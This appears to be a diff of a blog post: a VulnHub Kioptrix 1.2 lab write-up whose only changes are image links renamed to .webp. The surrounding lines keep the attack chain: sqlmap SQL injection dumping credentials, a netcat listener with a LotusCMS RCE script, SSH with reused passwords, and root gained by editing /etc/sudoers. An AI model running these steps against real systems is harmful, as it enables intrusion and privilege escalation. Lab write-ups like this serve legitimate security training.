@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Kioptrix: Level 1.2 (#3)](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix3/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_kioptrix3/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -49,18 +49,18 @@ tail -2 /etc/hosts
   192.168.92.184  kioptrix3.com
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot00.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp)  
 
 3\. We find a login page at the following url: `http://kioptrix3.com/index.php?system=Admin`  
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot01.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp)  
 
 4\. We find that the underlying CMS is `LotusCMS` and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for `LotusCMS`:  
 ```
 searchsploit lotuscms
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_kioptrix3/screenshot02.png)  
+![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp)  
 
 5\. We also find a gallery application hosted on the following url: `http://kioptrix3.com/gallery/`. We test this application for SQLi using `sqlmap` and are able to dump the `dev_accounts` table from the `gallery` database. This table lists unsalted MD5 hashes for users `dreg` and `loneferret` that are auto-cracked by `sqlmap`:  
 ```
@@ -76,9 +76,9 @@ sqlmap --batch -u "http://kioptrix3.com/gallery/gallery.php?id=null" --dump
   +----+------------+---------------------------------------------+
 ```
 
-![writeup.enumeration.steps.5.1](/static/files/posts_vulnhub_kioptrix3/screenshot03.png)  
+![writeup.enumeration.steps.5.1](/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.5.2](/static/files/posts_vulnhub_kioptrix3/screenshot04.png)  
+![writeup.enumeration.steps.5.2](/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -98,9 +98,9 @@ nc -nlvp 443
 ./lotusRCE.sh kioptrix3.com
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix3/screenshot05a.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_kioptrix3/screenshot05a.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix3/screenshot05b.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_kioptrix3/screenshot05b.png.webp)  
 
 2\. We can also `ssh` as users `dreg` or `loneferret` into the target system using the credentials we dumped from the `LotusCMS` database. This is possible because these users have reused their CMS credentials for local system access:  
 ```
@@ -108,7 +108,7 @@ ssh dreg@192.168.92.184
 ssh loneferret@192.168.92.184
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot06.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot06.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -140,7 +140,7 @@ sudo -l
     (root) NOPASSWD: /usr/local/bin/ht
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix3/screenshot07.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_kioptrix3/screenshot07.png.webp)  
 
 2\. We find that the user `loneferret` can run the `ht` editor with `sudo` privileges and as such can modify any system file. We decide to open the `/etc/sudoers` file and edit the entry for user `loneferret` and give this user unrestricted `sudo` access:  
 ```
@@ -149,16 +149,16 @@ sudo ht
     loneferret ALL=(ALL) ALL
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot08.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_kioptrix3/screenshot08.png.webp)  
 
 3\. Once the above changeas are done, we can now switch to `root` to complete the challenge:  
 ```
 sudo su
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot09.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_kioptrix3/screenshot09.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_kioptrix3/screenshot10.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_kioptrix3/screenshot10.png.webp)  
 
 ## Loot
 ### Hashes
